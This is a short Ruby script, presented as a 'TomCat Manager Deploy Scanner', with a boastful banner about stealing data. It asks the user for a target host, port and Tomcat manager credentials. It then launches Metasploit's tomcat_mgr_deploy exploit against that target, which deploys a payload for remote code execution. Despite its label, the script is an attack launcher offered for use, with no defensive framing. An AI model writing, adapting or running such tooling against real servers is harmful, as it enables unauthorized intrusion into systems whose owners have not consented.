require 'colorize'
puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  
        TomCat Manager Deploy Scanner
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] What is the Username? ".blue
print " [!] ---> ".yellow
username = gets.chomp

puts " [?] What is the Password? ".blue
print " [!] ---> ".yellow
password = gets.chomp

exec("msfconsole -x 'use exploit/multi/http/tomcat_mgr_deploy' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'setg USERNAME #{username}' -x 'setg PASSWORD #{password}' -x 'run'")

